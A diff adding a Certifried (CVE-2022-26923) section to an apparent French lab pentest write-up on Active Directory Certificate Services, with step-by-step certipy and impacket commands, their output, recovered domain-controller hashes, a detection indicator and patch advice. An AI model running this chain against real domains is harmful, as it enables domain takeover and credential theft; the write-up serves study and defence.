@@ -362,12 +362,79 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec2
 
 ---
 
+### Phase 8 — Certifried (CVE-2022-26923)
+
+Certifried exploite l'attribut `dNSHostName` d'un compte machine. Un utilisateur standard peut créer un compte machine (MAQ par défaut = 10), modifier son `dNSHostName` vers celui d'un DC, puis demander un certificat — la CA émet un certificat au nom du DC.
+
+**Pourquoi c'est critique** : tout Domain User peut usurper l'identité d'un DC via un simple changement d'attribut LDAP. La CA n'a aucun mécanisme de vérification entre le compte machine demandeur et le dNSHostName dans la requête.
+
+**19. Création d'un compte machine**
+
+```bash
+impacket-addcomputer essos.local/missandei:fr3edom -computer-name 'YOURCOMP3$' -computer-pass 'P@ssw0rd123!' -dc-ip 192.168.10.12
+```
+
+```
+[*] Successfully added machine account YOURCOMP3$ with password P@ssw0rd123!.
+```
+
+**20. Modification du dNSHostName vers MEEREEN (DC)**
+
+```bash
+certipy account update -u missandei@essos.local -p 'fr3edom' -user 'YOURCOMP3$' -dns 'meereen.essos.local' -dc-ip 192.168.10.12
+```
+
+```
+[*] Updating user 'YOURCOMP3$':
+    dNSHostName                         : meereen.essos.local
+[*] Successfully updated 'YOURCOMP3$'
+```
+
+**21. Demande de certificat Machine**
+
+```bash
+certipy req -u 'YOURCOMP3$@essos.local' -p 'P@ssw0rd123!' -dc-ip 192.168.10.12 -target 192.168.10.23 -ca ESSOS-CA -template Machine
+```
+
+```
+[*] Request ID is 24
+[*] Successfully requested certificate
+[*] Got certificate with DNS Host Name 'meereen.essos.local'
+[*] Certificate has no object SID
+[*] Wrote certificate and private key to 'meereen.pfx'
+```
+
+Le certificat est émis au nom de `meereen.essos.local` — le DC.
+
+**22. Authentification avec le certificat DC → hash machine**
+
+```bash
+certipy auth -pfx meereen.pfx -dc-ip 192.168.10.12
+```
+
+```
+[*] Using principal: 'meereen$@essos.local'
+[*] Got TGT
+[*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:c487f22308bbc67fca3d57a504c62a9a
+```
+
+Certifried → hash MEEREEN$ → DCSync possible. Chaîne complète : Domain User → créer machine → spoof dNSHostName → certificat DC → hash DC → DA.
+
+**23. Cleanup**
+
+```bash
+certipy account update -u missandei@essos.local -p 'fr3edom' -user 'YOURCOMP3$' -dns 'YOURCOMP3.essos.local' -dc-ip 192.168.10.12
+```
+
+---
+
 ## Credentials récupérés
 
 | Compte | Hash | Domaine | Méthode |
 |--------|------|---------|---------|
 | Administrator (ESSOS) | `54296a48cd30259cc88095373cec24da` | essos.local | ESC1/ESC2/ESC3/ESC4/ESC6 → certipy auth |
 | MEEREEN$ | `c487f22308bbc67fca3d57a504c62a9a` | essos.local | ESC8 → NTLM relay → certipy auth |
+| MEEREEN$ | `c487f22308bbc67fca3d57a504c62a9a` | essos.local | Certifried → certipy auth |
 
 ---
 
@@ -531,6 +598,7 @@ tags:
 | Template permission | Full Control pour un user standard | ESC4 |
 | EKU | `Any Purpose` ou `Certificate Request Agent` | ESC2/ESC3 |
 | Commande | `certipy req -upn administrator@...` | ESC1 exploitation |
+| Attribut LDAP | `dNSHostName` modifié sur un compte machine récent | Certifried CVE-2022-26923 |
 
 ---
 
@@ -541,6 +609,7 @@ tags:
 - Désactiver `EnrolleeSuppliesSubject` sur tous les templates custom
 - Forcer HTTPS sur le web enrollment : `certutil -setreg CA\EnforceEncryptForRequests 1`
 - Redémarrer le service CA après modification
+- Appliquer le patch KB5014754 (mai 2022) qui ajoute la vérification SID dans les certificats (bloque Certifried CVE-2022-26923)
 
 ### 1 semaine
 
@@ -600,6 +669,7 @@ graph TB
 - [The Hacker Recipes — ADCS](https://www.thehacker.recipes/ad/movement/adcs)
 - [MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
 - [BloodHound — ADCS ESC1](https://bloodhound.specterops.io/resources/edges/adcs-esc1)
+- [Oliver Lyak — Certifried CVE-2022-26923](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
 
 ---
 
